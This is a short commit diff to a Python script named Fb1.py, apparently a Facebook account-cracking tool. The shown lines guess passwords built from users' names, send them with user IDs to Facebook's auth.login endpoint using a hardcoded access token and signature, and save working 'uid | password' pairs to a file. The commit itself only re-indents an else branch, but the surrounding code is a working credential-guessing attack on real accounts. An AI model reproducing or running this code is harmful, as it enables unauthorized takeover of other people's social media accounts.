d7b09f5fa526aad92f0e5491d144b328a7af543b
Aryano Devil <81142233+aryanotriks@users.noreply.github.com>
2021-04-10 12:37:55 -0700

    Update Fb1.py

--- Fb1.py
+++ Fb1.py
@@ -264,8 +264,8 @@ def crapil():
 		            ok.write(uid+" | "+pass1+"\n")
 		            ok.close()
 		            oks.append(uid)
-		        else:
-		            pass2='name+"@#&+£"'
+			else:
+			    pass2='name+"@#&+£"'
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
